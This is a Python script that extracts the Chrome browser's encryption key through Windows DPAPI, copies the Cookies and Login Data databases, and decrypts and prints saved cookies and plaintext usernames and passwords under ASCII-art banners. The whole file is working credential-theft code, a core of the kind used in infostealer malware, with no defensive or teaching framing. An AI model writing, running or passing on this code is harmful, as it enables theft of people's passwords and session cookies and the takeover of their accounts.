import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import pyfiglet
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome

def re1 (name='Cookies&Password',font='doh') :
    re = pyfiglet.figlet_format(name,font)
    print(re)

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601  """

    try:

        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove 'DPAPI' str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
            # not supported
            return ""


def cookies():
    #cookies
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path1 = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = "Cookies.db"
    shutil.copyfile(db_path1, filename)

    # connect to the database
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    res=cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    key = get_encryption_key()
    re1(' -Cookies- ')
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            #already decrypted
            decrypted_value = value
        print(f"""
        Host: {host_key}
        Cookie name: {name}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        encrypted_value = {encrypted_value}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================""")
    db.commit()
    # close connection
    db.close()
	

def password():
#password
    re1('Password','doh')
    db_path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path2, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    key = get_encryption_key()
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_data(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        print(f"Origin URL: {origin_url}")
        print(f"Action URL: {action_url}")
        print(f"Username: {username}")
        print('encrypted_password:',row[3])
        print(f"Password: {password}")
        print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
	#---------END-------------
    cursor.close()
    re1('-- E N D --')
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass